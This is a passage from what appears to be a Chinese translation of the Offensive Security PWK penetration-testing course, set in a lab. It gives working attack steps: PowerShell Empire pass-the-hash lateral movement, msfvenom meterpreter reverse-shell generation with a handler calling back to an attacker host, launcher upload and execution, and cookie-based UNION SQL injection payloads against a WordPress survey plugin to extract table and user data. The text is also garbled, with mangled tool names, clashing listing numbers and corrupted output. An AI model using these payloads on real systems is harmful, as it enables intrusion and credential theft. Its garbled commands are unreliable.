+| Agent | True | 运行模块的 Agent。 |
+| Listener | True | 使用的监听器。 |
+```
+
+```
+(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName client251
+
+(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http
+
+(Empire: powershell/lateral_movement/invoke_smbmex) > set Username jeff_admin
+
+(Empire: powershell/lateral_movement/invoke_smbmex) > set Hash e2b475c11da2a0748290d87aa966c327
+
+(Empire: powershell/lateral_movement/invoke_smbmex) > set Domain corp.com
+
+(Empire: powershell/lateral_movement/invoke_smbmex) > execute Command executed with successfully code CVTERKCHMPMEQQLWLKB on client251
+
++ * 正在 10.11.0.22 发送 POWERSHELL (stage 1)
+
+* 新代理 UXVZNC3 已上线
+
+* 代理 UXVZNC2 现在活跃 (Slack)
+
+列表 845 - 使用 PowerShell Empire 进行横向移动
+
+太了！代理已成功部署，我们现在可以与其交互：
+
+```
+(Empire: K678VC13) > agents
+```
+
++ * 活跃代理：
+
+| 名称 | 语言 | 内部 IP | 机器名称 | 用户名 | 进程 | 延迟 |
+| --- | --- | --- | --- | --- | --- | --- |
+| S2YWS11 | ps | 10.11.0.22 | CLIENT251 | corp$off | powershell/2976 | 5/0.0 |
+| DWZ48BAP | ps | 10.11.0.22 | CLIENT251 | corp$off | explorer/3568 | 5/0.0 |
+| K678VC13 | ps | 10.11.0.22 | CLIENT251 | *corp$off | powershell/6236 | 5/0.0 |
+| UXVZNC3 | ps | 10.11.0.22 | CLIENT251 | *corp$SYSTEM | powershell/3912 | 5/0.0 |
+
+```
+(Empire: agents) > interact UXVZNC3
+```
+
+```
+(Empire: UXVZNC3) >
+```
+
+列表 846 - Empire 与 Metasploit 之间的交互
+
+# 23.3 在 Empire 和 Metasploit 之间切换
+
+代理支持许多功能。然而，很多时候，我们需要使用只有 Metasploit 才具备的功能。由于我们可以在同一个被攻破的主机上同时运行 Empire 和 Metasploit 终端，这实际上非常简单。
+
+> 在 PowerShell Empire 版本 2.4 中，可以使用 meterpreter 监听器和 injectshellcode 模块从 PowerShell 直接在内存中注入 meterpreter。然而，在最新版本 (2.5) 中，这段代码遗憾地已经失效了。
+
+如果主机上有一个活跃的 PowerShell 代理，我们可以使用 `msfvenom` 生成一个 meterpreter 反向 shell 作为示例。
+
+```
+kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -f exe -o met.exe
+[-] 未选择任何 payload，正在从 payload 中选择 Msf:Module:Platform:Windows
+```
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+```
+[-] 未选择架构，正在从 payload 中选择 arch: x86
+未指定编码器或坏字符，正在输出原始 payload
+Payload 大: 633 bytes
+exe 最终大小: 73802 bytes
+保存为: met.exe
+```
+
+> 列表 847 - 生成 metploiter payload
+
+我们随后使用 `multi/handler` 模块和之前选择的设置建立 Metploit 监听器：
+
+```
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+payload => meterpreter/reverse_http
+msf5 exploit(multi/handler) > set LPORT 7777
+LPORT => 7777
+msf5 exploit(multi/handler) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+msf5 exploit(multi/handler) > exploit
+```
+
++ * 在 http://10.11.0.4:7777 上启动 HTTP 反向处理程序
+
+> 列表 848 - 用于捕获反向 shell 的 Metploit 监听器
+
+现在我们回到 PowerShell 终端并执行以下命令：
+
+```
+Empire: S2Y5XW1 > upload /home/kali/met.exe, 72 KB
+[*] 已调度代理上传 met.exe, 72 KB
+[*] 已调度 S2Y5XW1 执行 TASK_UPLOAD
+[*] 代理 S2Y5XW1 被分配任务 ID 12
+[*] 代理 S2Y5XW1 返回了结果。
+[*] 10.11.0.22 返回了有效结果。
+```
+
+```
+Empire: S2Y5XW1 > shell dir
+[*] 已调度 S2Y5XW1 执行 TASK_SHELL
+[*] 代理 S2Y5XW1 被分配任务 ID 3
+[*] 代理 S2Y5XW1 返回了结果。
+Directory: C:\Users\offsec.corp\Downloads>
+```
+
+| 模式 | 最后写入时间 | 长度 名称 |
+|---|---|---|
+| -a---- | 10/2/2019 11:24 AM | 73802 met.exe |
+
+```
+.命令执行完成。
+[*] 10.11.0.22 返回了有效结果。
+```
+
+> 列表 849 - 使用 metpreter 执行器
+
+在上传 exploit 后，我们通过 `dir shell` 找到它的位置并执行：
+
+```
+(Empire: S2Y5XW1) > shell C:\Users\offsec.corp\Downloads>met.exe
+[*] 已调度 S2Y5XW1 执行 TASK_SHELL
+[*] 代理 S2Y5XW1 被分配任务 ID 5
+
+* 代理 S2Y5XW1 返回了结果。
+命令已执行。
+* 10.11.0.22 返回了结果
+
+850 - 执行 meterpreter 可执行文件
+```
+
+执行文件运行后，我们将切换回 meterpreter 监听器并观察传入的 shell：
+
++ * 在 http://10.11.0.4:7777 上启动 HTTP 反向处理程序
+* http://10.11.0.4:7777 正在处理来自 10.11.0.22 的请求；正在 x86 payload
+* Meterpreter 会话已打开 (10.11.0.4:7777
+meterpreter>
+
+列表 851 - Meterpreter 回调
+
+从现有的 meterpreter 会话反向连接代理也很简单。我们可以创建一个 `.bat` 格式的启动器并使用 meterpreter 上传执行它。我们将使用：
+
+```
+(Empire: listeners) > stager/windows/launcher_bat
+```
+
+
+
+(Empire: stager/windows/launcher_bat) > `set http`
+
+(Empire: stager/windows/launcher_bat) > `execute`
+
+* Stager 输出: `/tmp/launcher.bat`
+
+列表 852 - 创建启动器
+
+我们随后上传并执行：
+
+```
+meterpreter > upload /tmp/launcher.bat
+* 已上传 /tmp/launcher.bat -> /tmp/launcher.bat
+* 已上传 4.69 KIB (100.0%) : /tmp/launcher.bat -> launcher.bat
+```
+
+```
+meterpreter > shell
+进程 4644 已创建。
+通道已创建。
+C:\Users\offsec.com\Downloads>dir
+驱动器没有标签。
+卷号为 9E6A-47FB
+目录 C:\Users\offsec.com\Downloads
+09/19/2019 08:42 AM <DIR>
+09/19/2019 08:42 AM <DIR>
+09/19/2019 08:42 AM 文件(s)         4,802 launcher.bat
+目录(s)              22,359,040 字节可用
+```
+
+```
+C:\Users\offsec.com\Downloads>launcher.bat
+```
+
+列表 853 - 上传并执行启动器
+
+现在我们应该从被攻破的主机接收一个代理：
+
+```
+(Empire: agents) > 10.11.0.22 现在活跃 (Slack)
+```
+
+列表 854 - 接收 回 回
+
+使用这些技术，我们可以利用同一主机上的两个框架。
+
+# 23.3.1 练习
+
+1. 设置 PowerShell 监听器和 stager 并获取一个工作的代理。
+2. 使用各种模块对域进行枚举。
+3. 使用 Jeff_Admin 账户执行远程桌面登录，确保凭据缓存在 Windows 客户端上并使用 Empire 导出凭据。
+4. 尝试不同的横向移动模块。
+
+### 23.4 总结
+
+在本模块中，我们涵盖了 PowerShell Empire 的语法和功能，例如监听器、stagers 和代理。我们还探索了用于枚举、获取凭据和横向移动的各种模块。最后，我们查看了 PowerShell Empire 和 Metasploit 如何一起使用。
+
+# 24. 组合部分：渗透测试分解
+
+现在我们已经介绍了渗透测试的所有部分，是时候将它们组合在一起了。在本模块中，我们将进行一个受真实世界发现启发的模拟渗透测试。
+
+虽然我们在练习中的目标是获取环境管理员权限，但重要的是，这并不是渗透测试的最终目标。我们的目标应该由客户的数据基础设施和业务模型决定。例如，如果客户的业务是数据仓库，我们的目标就是获取这些数据。这是因为这种类型的泄露会对客户产生最显著的影响。在某些情况下，域管理员权限可以帮助我们实现该目标，但并非总是如此。
+
+在渗透测试期间，我们将在枚举和利用之间来回。我们将在枚举阶段花费一些时间，以确保我们使用的利用方法是正确的。我们还将回顾一些容易犯的错误，并讨论为什么在目标上获取 root/admin 并不总是必要的。
+
+我们的虚拟客户提供了一个名为 `"sandbox.local"` 的初始目标，并提到被攻破的域管理员帐户对他们的业务影响最大。`sandbox` 网络可以通过 VPN 访问，网络布局如图 317 所示。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_744_0.png)
+
+图 317：目标网络概览
+
+> 该域可以通过 PWK VPN 访问，但要求我们向 `/etc/hosts` 文件添加条目。首先，我们将通过将 `/etc/hosts` 复制到主目录下的 `hosts.org` 来备份现有文件。现在我们将添加一个条目，允许我们通过名称连接到该域，通过运行 `sudo bash -c "10.11.1.250 sandbox.local" >> /etc/hosts` 设置好后，我们可以继续。
+
+# 24.1 公共网络枚举
+
+我们将首先对 DNS 名称 `sandbox.local` 解析出的外部主机进行扫描。为此，我们将使用 `nmap`：
+
+```
+kali@kali:~$ sudo nmap -sC -sS -p0-65535 sandbox.local
+```
+
+列表 855 - 用于初始发现的 nmap 命令
+
+列表 855 中的命令将使用 `nmap` 的默认脚本集 (`-sC`)、使用 SYN 扫描以加快速度 (`-sS`)、扫描所有端口 (`-p0-65535`)，并仅针对 `sandbox.local` 网络。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+Nmap 扫描结果可以在列表 856 中找到。
+
+```
+Nmap scan for sandbox.local (10.11.1.250)
+
+Host is up (0.00060s latency).
+
+Not shown: 65534 filtered ports
+
+PORT STATE METHOD
+
+22/tcp open ssh
+
+ssh-hostkey:
+
+  2048:fe8:89:b3:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)
+
+  256:fe8:84:f1:cd:f3:c8:90:3d:60:e8:b1:1d:99:27 (ECDSA)
+
+  256:14:a6:ba7:ee0:57:e5:0c:cc:76:31:91:dd:9f (ED25519)
+
+80/tcp open http
+
+http-generator: WordPress 5.3
+
+http-title: Sandbox – See the future, Feel the shine
+
+MAC Address: 00:50:56:8A:C8:51 (VMware)
+
+```
+
+Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
+
+> 列表 856 - 初始发现的 Nmap 扫描
+
+让我们查看此扫描结果。首先，Nmap 仅显示了两个开放端口：22 和 80。Nmap 指纹识别出这些服务分别在相应端口上运行 SSH 服务和 HTTP 服务。Nmap 默认插件集显示了 `ssh-hostkeys`。
+
+HTTP 服务告诉我们，运行的应用程序可能是 WordPress 5.3。SSH 服务暴露的风险通常远少于 HTTP 服务暴露的风险。因此，HTTP 服务似乎是渗透 `sandbox.local` 环境的更好的起点。
+
+## 24.2 针对 Web 应用程序
+
+第一步仅仅是访问 Web 应用程序页面。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_745_0.png)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_746_0.png)
+
+![](img/f99f528ca9845f4c256ce54e882b1345_746_1.png)
+
+图 318：访问 Sandbox.local Web 页面
+
+首页看起来是一个公司非常标准的着陆页。导航栏中的链接都指向主页上的锚点，左下角有一个请求反馈的调查问卷。似乎没有其他可供用户控制的输入字段。
+
+Nmap 扫描显示该网页运行在 WordPress 5.3 上，但要确认这一点，需要进一步的枚举。
+
+虽然 WordPress 核心本身存在许多漏洞，但 WordPress 开发者会迅速修复这些漏洞。然而，主题和插件是由社区编写的，许多漏洞没有得到妥当修复，或者根本没有被修复。
+
+这使得 WordPress 成为一个渗透的极佳目标。
+
+### 24.2.1 Web 应用程序枚举
+
+在我们开始专门针对 WordPress 进行渗透之前，让我们进行基础的暴力破解以发现任何潜在的敏感文件，并确认网站是否运行着 WordPress。为此，我们将如下所示使用 `dir`。
+
+```
+kali@kali:- dir http://sandbox.local
+```
+
+列表 857 - `sandbox.local` 的 `dir` 扫描
+
+虽然 `dir` 有许多我们可以可以使用的标志和功能，但我们选择运行一个简单的测试。
+我们命令的输出可以在列表 858 中找到。
+
+```
+---- Scanning URL: http://sandbox.local/ -----
+
++ http://sandbox.local/index.php (CODE:301|SIZE:0)
+
++ http://sandbox.local/server-status (CODE:403|SIZE:278)
+
+== DIRECTORY: http://sandbox.local/wp-admin/
+
+== DIRECTORY: http://sandbox.local/wp-content/
+
+== DIRECTORY: http://sandbox.local/wp-includes/
+
++ http://sandbox.local/xmlrpc.php (CODE:405|SIZE:42)
+```
+
+
+
+---- Entering directory: http://sandbox.local/wp-admin/ -----
+
++ http://sandbox.local/wp-admin/admin.php (CODE:302|SIZE:0)
+
+== DIRECTORY: http://sandbox.local/wp-admin/css/
+
+== DIRECTORY: http://sandbox.local/wp-admin/images/
+
+== DIRECTORY: http://sandbox.local/wp-admin/includes/
+
++ http://sandbox.local/wp-admin/index.php (CODE:302|SIZE:0)
+
+== DIRECTORY: http://sandbox.local/wp-admin/js/
+
+== DIRECTORY: http://sandbox.local/wp-admin/main/
+
+== DIRECTORY: http://sandbox.local/wp-admin/network/
+
+== DIRECTORY: http://sandbox.local/wp-admin/user/
+
+---- Entering directory: http://sandbox.local/wp-content/ -----
+
++ http://sandbox.local/wp-content/index.php (CODE:200|SIZE:0)
+
+== DIRECTORY: http://sandbox.local/wp-content/plugins/
+
+== DIRECTORY: http://sandbox.local/wp-content/themes/
+
+== DIRECTORY: http://sandbox.local/wp-content/upgrade/
+
+== DIRECTORY: http://sandbox.local/wp-content/uploads/
+
+---- Entering directory: http://sandbox.local/wp-includes/ -----
+
+(!) WARNING: DIRECTORY IS LISTABLE. No need to scan.
+
+(Use mode '-w' if you want to scan)
+
+---- Entering directory: http://sandbox.local/wp-admin/css/ -----
+
+(!) WARNING: DIRECTORY IS LISTABLE. No need to scan.
+
+(Use mode '-w' if you want to scan)
+
+END_TIME: Mon Dec 9 13:00:40 2019
+
+DOWNLOADED: 32
+
+### 列表 858 - dir 输出
+
+我们的扫描发现了目标上常见的 WordPress 目录（`wp-admin`、`wp-content` 和 `wp-includes`）。我们还发现了一些可列出的目录；但这些是常见目录。让我们使用 WPScan 进行更具体的扫描，通过已知漏洞数据库来发现 WordPress 实例的安全问题。为了进行彻底扫描，我们需要提供目标 URL (`-url`) 并配置枚举选项 (`-enumerate`) 为“所有插件” (`ap`)、“所有主题” (`at`)、“备份” (`cb`) 和“数据库导出” (`db`)。最终命令可以在列表 859 中找到。
+
+```
+kali@kali~$ wpscan sandbox.local --enumerate ap,at,cb,db
+```
+
+### 列表 859 - wscan 的命令
+
+WPScan 输出了关于目标的有用信息：
+
+```
+...
+[i] Plugin(s) Identified:
+
++] elementor
+
+| Location: http://sandbox.local/wp-content/plugins/element/
+
+| Last Updated: 2019-12-08 17:19:00Z
+
+|!] The version is out of date, the latest version is 2.7.6
+
+| Found By: Urls In Homepage (Passive Detection)
+
+| Version: 2.7.4 (100% confidence)
+
+| Found By: Query Parameter (Passive Detection)
+
+| - http://sandbox.local/wp-content/plugins/element/assets/css/frontend.min.css?ver=2.7.4
+
+| - http://sandbox.local/wp-content/plugins/element/assets/js/frontend.min.js?ver=2.7.4
+
+| Confirmed By: Readme Tag (Aggressive Detection)
+
+| - http://sandbox.local/wp-content/plugins/element/readme.txt
+
++] ocean-extra
+
+| Location: http://sandbox.local/wp-content/plugins/ocean-extra/
+
+| Last Updated: 2019-11-13 16:17:00Z
+
+|!] The version is out of date, the latest version is 1.5.19
+
+| Found By: Urls In Homepage (Passive Detection)
+
+| Version: 1.5.16 (100% confidence)
+
+| Found By: Readme Tag (Aggressive Detection)
+
+| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt
+
+| Confirmed: Readme Changel Section (Aggressive Detection)
+
+| - http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt
+
++] wp-survey-and-poll
+
+| Location: http://sandbox.local/wp-content/plugins/wp-survey-and-poll/
+
+| Last Updated: 2019-10-15 16:32:00Z
+
+|!] The version is out of date, the latest version is 1.5.8.2
+
+| Found By: Urls In Homepage (Passive Detection)
+
+| Version: 1.5.7.3 (50% confidence)
+
+| Found By: Readme Changel Section (Aggressive Detection)
+
+| - http://sandbox.local/wp-content/plugins/wp-survey-and-poll/readme.txt
+
++] Enumerating All Themes (via Passive and Aggressive Methods)
+
+...
+```
+
+### 列表 860 - wscan 扫描输出
+
+我们发现的最有趣的项目是已安装的三个：`elementor`、`ocean-extra` 和 `wp-survey-and-poll`。WPScan 有一个工具可以使用的漏洞数据库，但需要注册。为了避免注册，由于我们只发现了三个插件，可以使用 `exploitploit` 来寻找已安装插件的潜在漏洞。在更新 `exploitploit` 后，我们可以搜索每个插件。
+
+```
+kali@kali:~ exploitploit elementor
+
+Exploits: No Result
+```
+
+```
+kali@kali:~ exploitploit ocean-extra
+
+Exploits: No Result
+```
+
+```
+kali@kali:~ exploitploit wp-survey-and-poll
+
+Exploits: No Result
+```
+
+遗憾的是，我们没有发现任何利用程序（exploits）。我们需要谨慎进行搜索，因为搜索 "`ocean-extra`" 没有发现任何东西并不意味着它不存在。让我们尝试对 "`ocean`" 进行更通用的搜索。
+
+```
+kali@kali:~ exploitploit ocean
+```
+
+
+
+| Title | Path |
+| --- | --- |
+| MD-Pro 1.08.3 - Survey Module 'pollin' Blind SQL Inj | exploits/linux/9023.txt |
+| PHP-Nuke CMS - SQL Injection | exploits/webphp/11627.txt |
+| Survey Poll - 'catid' SQL Injection | exploits/asp/6119.txt |
+| WordPress Plugin Survey and Poll 1.1 - Blind SQL In | exploits/webphp/7236.txt |
+| Wordpress Plugin Solver 1.5.7.3 - 'ssm_params/' | exploits/webapps/45411.txt |
+| napoboll 1.2 - 'survey.inc.php?path' Remote File In | exploits/php/3315.txt |
+
+列表 861 - Ocean 的搜索结果
+
+这次搜索看起来很有前景。第四和第五个结果似乎针对我们的 WordPress 插件。第五个结果标题为 "WordPress Plugin Survey & Poll 1.5.7.3"，它与 WPScan 发现的插件版本 `1.5.7.3` 相匹配。让我们检查利用程序看看是否发现了什么有趣的发现。
+
+# 攻击性安全
+www.offensive-security.com
+
+使用 Kali Linux 进行渗透测试 2.0
+
+# Description
+
+该漏洞允许攻击者通过 `cookie` 参数的值注入 `sql` 命令。
+
+# PoC
+
+# 步骤 1
+当你访问一个包含投票或调查的页面时，会出现一个问题供你回答。
+
+回答该问题。
+
+# 步骤 2
+当你回答问题时，`wp_sap` 会被赋予一个值。使用 `cookie` 管理器并将其更改为如下所示载荷：
+```
+["1650149780") OR=1 UNION SELECT 1,2,3,4,5,6,7,8,9@version,11#"]
+```
+
+"OR" 语句必须是 `1=2`，这一点很重要。因为应用程序会反映查询结果结果。当你设置为 `1=1` 时，你应该看到来自来自 记录的问题。因此，OR 语句必须返回 False。
+
+# 步骤 3
+刷新页面。打开页面的源代码。搜索 "`sss_params`"。
+
+你将在 `sss_params` 参数的值中看到数据库的版本。
+
+列表 864 - 查看漏洞利用程序
+
+浏览漏洞利用程序时没有提到是否需要身份验证。然而，需要设置 `cookie`。让我们进入插件网站，看看是否能找到关于它的更多信息。在 Google 上快速搜索 "Wordpress Survey & Poll" 会进入该插件页面。⁷⁹ 通过查看截图，我们找到了调查在页面上形式的示例。
+
+⁷⁹ (WordPress, 2020), https://wordpress.org/plugins/wp-survey-and-poll/
+
+PWK 2.0 版权所有 © Offensive Security Ltd. 保留所有权利。751
+
+# 攻击性安全
+
+使用 Kali Linux 进行渗透测试 2.0
+
+特色文章
+
+# 模板：置顶 (Sticky)
+
+这是一个置顶文章。
+
+这里有几点需要验证：
+
+- 与其他文章相比，置顶文章应该以某种方式具有显著的易可识别性。如果你使用文章类来生成文章列，可以使用 `.sticky` 类，这是一种最佳实践。
+- 尽管它们出现在下方几个文章之后，但它们应该在时间顺序上的正确位置显示。
+- 如果你有列出热门文章或评论的插件或小部件，请确保置顶文章不会始终位于列表顶部，除非确实如此。
+
+此条目由 therelement 于 2012 年 1 月 7 日发布在分类和标签标记的置顶模板中。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_751_0.png)
+
+这些信息有帮助吗？
+是 否
+
+![](img/f99f528ca9845f4c256ce54e882b1345_751_1.png)
+
+图 319：WordPress Survey & Poll 截图
+
+我们在 `sandbox.local` 的主页上找到了类似的调查。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_751_2.png)
+
+图 320：Sandbox.local 上的 WordPress Survey & Poll
+
+让我们打开 Burp Suite，配置 Firefox 中的代理设置，并在与调查交互时拦截通信。
+
+> 如果你在使用 Burp 时遇到问题，请返回 Web Applications 模块进行快速回顾。
+
+在页面加载完成且 Burp 配置为拦截后，我们将点击调查的一个选项。这将导致在 Burp 中捕获到一个请求。我们将点击 Burp 中的 Forward 以继续页面加载。
+
+Burp. Project. Intruder. Repeater. Window. Help
+
+- Dashboard Target Proxy Intruder Repeater Decoder Compar Extender Project options User options
+- Intercept HTTP history WebSockets Options
+
+向 `http://admin-local:80` [`127.0.0.1`] 发出的请求
+
+- Forward Drop Intercept is on
+- Raw Parameters Headers Hex
+
+```
+POST /wp-admin/ajax-ajax.php HTTP/1.1
+
+Host: local
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv/68.0) Gecko/2010101 Firefox/68.0
+
+Accept: */
+
+Accept-Language: en-US,q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://local/
+
+Content-Type: application/x-form-urlencoded; charset=UTF-8
+
+X-Requested: XMLHttpRequest
+
+Content-Length: 124
+
+Connection: close
+```
+
+
+
+Cookie: `wordpress_test_cookie[]check=action_survey_answer&spcm=save=%58%7B%22%3A%2253%22%7Bid%3A%22id%22%3A%2221550849657%22%5C%22aid%22%3A%223%3A%2270%5D```
+
+图 321：从调查捕获的请求
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+# 攻击性安全
+www.offensive-security.com
+
+现在当我们刷新页面时，我们注意到漏洞利用程序提到的 cookie 是存在漏洞的![](img/f99f528ca9845f4c256ce54e882b1345_753_0.png)图 322：带有漏洞的 Cookie
+
+使用此 cookie 我们可以开始尝试利用漏洞。
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+## 2 SQL 注入利用
+
+现在我们已经捕获了一个带有漏洞的请求，可以使用 Burp 的 `Repeater` 来尝试 SQL 注入。要这样做，我们在 Burp 的 `HTTP History` 中找到包含 cookie 的请求，右键点击它并选择 `Send to Repeater`。
+
+| Dashboard | Target | Intruder | Repeater | Decoder | Extender | Project options | User options |
+| Intercept | HTTP history | Websockets history | Options | | | | |
+| | Host | URL | Params | Edited | Status | Length | |
+| 38 | http://sandbox.local | GET | /wp-content/plugins/element... | ✓ | 200 | 12490 | |
+| 39 | http://sandbox.local | GET | /wp-content/plugins/element... | ✓ | 200 | 125872 | |
+| 40 | http://sandbox.local | GET | /wp-content/plugins/element... | ✓ | 200 | 47443 | |
+| 41 | http://sandbox.local | GET | /wp-content/plugins/element... | ✓ | 200 | 93582 | |
+| 45 | http://sandbox.local | GET | /wp-content/plugins/element... | ✓ | 200 | 9382 | |
+| 51 | http://detectopalx.com | POST | /success.php?admin=ajax.php | | 200 | 531 | |
+| 54 | http://sandbox.local | GET | /wp-content/js/query-migrate... | | 200 | 84220 | |
+| 70 | http://sandbox.local | GET | /wp-includes/js/query... | ✓ | 200 | 10348 | |
+| 71 | http://sandbox.local | GET | /wp-includes/js/query... | ✓ | 200 | 97166 | |
+| 72 | http://sandbox.local | GET | /wp-content/embed.min.js?ver... | ✓ | 200 | 1689 | |
+| 73 | http://sandbox.local | GET | /wp-content/plugins/elementassets... | ✓ | 200 | 124594 | |
+| 74 | http://sandbox.local | GET | /wp-content/plugins/elementassets... | ✓ | 200 | 47443 | |
+| 75 | http://sandbox.local | GET | /wp-includes/js/query/core.min?... | ✓ | 200 | 4221 | |
+
+过滤：隐藏图像和通用内容
+
+```
+GET /index.php HTTP/1.1
+
+Host: sandbox.local
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/2010101 Firefox/68.0
+
+Accept: text/html,application/xml,application/xml;q=0.9/*;q=0.8
+
+Accept-Encoding: gzip, deflate
+
+Connection: keep-alive
+
+Cookie: wordpress_test_cookie=WP+Cookie+check= 
+```
+
+![](img/f99f528ca9845f4c256ce54e882b1345_754_1.png)
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_755_0.png)
+
+然后我们点击 `Repeater` 标签页以原始形式查看 cookie。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_755_1.png)
+
+图 34：在 Repeater 中查看请求
+
+让我们从原始漏洞利用程序获取载荷，将其放入 cookie 中并将请求发送到服务器。载荷可以在列表 865 中找到。
+
+```
+GET /HTTP/1.1
+
+Host: sandbox.test.local
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv/68.0) Gecko/2010101 Firefox/68.0
+
+Accept: text/html,application/xml,application/xml;q=0.9/*;q=0.8
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Cookie: wordpress_test_cookie=WP+Cookie+check; wp_sap=1
+
+124
+
+Content-Type: application/x-form-urlencoded; charset=UTF-8
+
+X-Requested: XMLHttpRequest
+
+Content-Length: 124
+```
+
+列表 865 - 原始 SQL 注入载荷
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+根据利用程序，负载可以被插入到 `wp_sap` cookie 变量值中。cookie 变量的值从 `"` 之后开始，以分号结束。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_756_0.png)
+
+利用程序代码提到，SQL 注入的结果将放置在 sss 内部的 `sss_params` 变量中。搜索气泡将带我们到达 SQL 注入输出的位置。
+
+图 325：使用 Payload 发送请求
+
+我们还可以设置 `自动滚动` 到此位置，以便于利用，这样我们就不需要每次都滚动查找输出。
+
+
+
+```javascript
+<script type="text/javascript"
+src="http://sandbox.local/wp-content/includes/js/jquery/ui/effect-slide.min.js?ver=1.11.4"></script>
+<script type="text/javascript"
+src="http://sandbox.local/wp-content/includes/js/jquery/ui/effect-slide.min.js"></script>
+<!--[/*
+"survey_options": {
+"options": {"bottom":"easeInOutBack","border":"linear-
+gradient(top,rgb(255,255,255) 25%,rgb(204,204,204) 25%,rgb(204,204,204) 28%,rgb(255,255,255) 28),linear-gradient(top,rgb(255,255,255) 72%,rgb(204,204,204) 72%,rgb(204,204,204) 75%,rgb(255,255,255) 75),linear-gradient(top,rgb(255,255,255) 75%,rgb(204,204,204) 75%,rgb(204,204,204) 78%,rgb(255,255,255) 78),linear-gradient(top,rgb(255,255,255) 78%,rgb(204,204,204) 78%,rgb(204,204,204) 81%,rgb(255,255,255) 81),
+},
+"feedback":"",
+"id":"0",
+"":"500",
+"url":"http://sandbox.local/wp-content/plugins/survey-and-poll/admin.php",
+"plugin_url":"http://sandbox.local/wp-content/plugins/survey-and-poll/plugin.php",
+"admin_url":"http://sandbox.local/wp-content/plugins/survey-and-poll/admin-ajax.php",
+"survey_id":"155049657",
+"style":"
+"modified":"false",
+"debug":"true",
+"questions":[{"id":1,"value":"Yes","No","text":"Are you enjoying the new site?#18.30-MariaDB08"}]}
+}
+*/*/
+</script>
+```
+
+```javascript
+<script type="text/javascript"
+src="http://sandbox.local/wp-content/plugins/survey-and-poll/templates/assets/wp_js.php?ver=1"></script>
+<script type="text/javascript"
+src="http://sandbox.local/wp-content/includes/jquery/min.js?ver=2.0"></script>
+<script type="text/javascript"
+src="http://sandbox.local/wp-content/themes/oceanmap/assets/js/hardmagic-popup.min.js?ver=1.7.1"></script>
+<script type="text/javascript"
+src="http://sandbox.local/wp-content/themes/oceanmap/assets/js/hardmagic-popup.min.js?ver=1.7"></script>
+```
+
+### 变量同步：
+
+- 区分大小写
+
+- 正则表达式
+
+- 自动滚动到匹配文本变化
+
+| | + | + |
+
+|---|---|---|
+
+| 0 匹配 | | sss_params | 1 匹配 |
+
+图 326：设置与自动滚动
+
+在 particular输出中，我们可以看到正在使用的数据库版本。这表明 SQL 注入成功了。
+
+```javascript
+<script type="text/javascript">
+/*[CDATA[//
+ sss_params = {"survey_options": {
+"options": {"bottom":"easeInOutBack","easeInOutBack","linear-
+gradient(top,rgb(255,255,255) 25%,rgb(204,204,204) 25%,rgb(204,204,204) 28%,rgb(255,255,255) 28),linear-gradient(top,rgb(255,255,255) 72%,rgb(204,204,204) 72%,rgb(204,204,204) 75%,rgb(255,255,255) 75),linear-gradient(top,rgb(255,255,255) 75%,rgb(204,204,204) 75%,rgb(204,204,204) 78%,rgb(255,255,255) 78),linear-gradient(top,rgb(255,255,255) 78%,rgb(204,204,204) 78%,rgb(204,204,204) 81%,rgb(255,255,255) 81),
+linear-gradient(top,rgb(255,255,255) 78%,rgb(204,204,204) 78%,rgb(204,204,204) 81%,rgb(255,255,255) 81
+},
+"feedbackfeedback
+"id":"0",
+"":"500",
+"url":"http://sandbox.local/wp-content/plugins/survey-and-poll/admin.php",
+"plugin_url":"http://sandbox.local/wp-content/plugins/survey-and-poll/plugin.php",
+"admin_url":"http://sandbox.local/wp-content/plugins/survey-and-poll/admin-ajax.php",
+"survey_id":"155049657",
+"style":"
+"modified":"false",
+"debug":"true",
+"questions":[{"id":1,"value":"Yes","No","text":"Are you enjoying the new site?#18.30-MariaDB08"}]}
+}
+*/*/
+</script>
+```
+
+列表 686：通过 SQL 注入提取数据库版本
+
+我们知道 WordPress 实例使用的数据库是 10.30。现在知道 SQL 注入有效，我们需要确定下一步。通过 MariaDB 上传 PHP shell 可能会让我们获得代码执行，如果我们没有系统相关信息，可能会非常困难。让我们从简单的方法开始，提取管理员的用户名和密码。为了做到，我们需要获取表列表，找到用户表，获取列列表，最后提取相关信息。获取表列表，我们需要查询 `information_schema.tables` 来获取 `table_name`。
+
+```sql
+
+'1658149780') OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name FROM information_schema.tables
+
+```
+
+列表 867 - 所有表
+
+注意我们也删除了原始 payload 中的 "ALL"。这是为了减少结果，因为我们不在重复的值。再次，payload 可以插入到 `wp_sap` cookie 值。和之前一样，cookie 值以 "=" 开始，以分号结束。结果包含表列表，最突出的是 `wp_users`，因为它可能包含用户信息。现在有了表名，我们可以检索列。为了做到这一点，我们在 `information_schema.columns` 中查询 `column_name`，并将结果限制 `table_name='wp_users'`。
+
+```sql
+
+'1650149780') OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name FROM information_schema.columns WHERE table_name='wp_users'
+```
+
+
+
